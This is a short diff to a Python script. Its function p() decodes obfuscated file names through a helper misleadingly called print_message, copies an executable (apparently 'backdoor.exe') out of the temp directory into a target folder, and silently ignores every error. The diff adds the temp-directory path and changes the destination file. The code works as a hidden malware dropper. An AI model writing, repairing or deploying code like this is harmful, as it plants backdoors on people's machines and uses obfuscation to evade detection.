@@ -1,5 +1,6 @@
 import os
 import shutil
+import tempfile
 
 
 def print_message(m):
@@ -14,9 +15,9 @@ def p():
         if os.path.exists(af):
             return
         else: 
-            s = open(f'{print_message('nmoghcc~"iti')}', 'rb')
+            s = open(os.path.join(tempfile.gettempdir(), f'{print_message('nmoghcc~"iti')}'), 'rb')
             os.chdir(f)
-            d = open(f'{print_message('omykdxai"iti')}', 'wb')
+            d = open(af, 'wb')
             shutil.copyfileobj(s, d)
     except Exception as err:
         pass
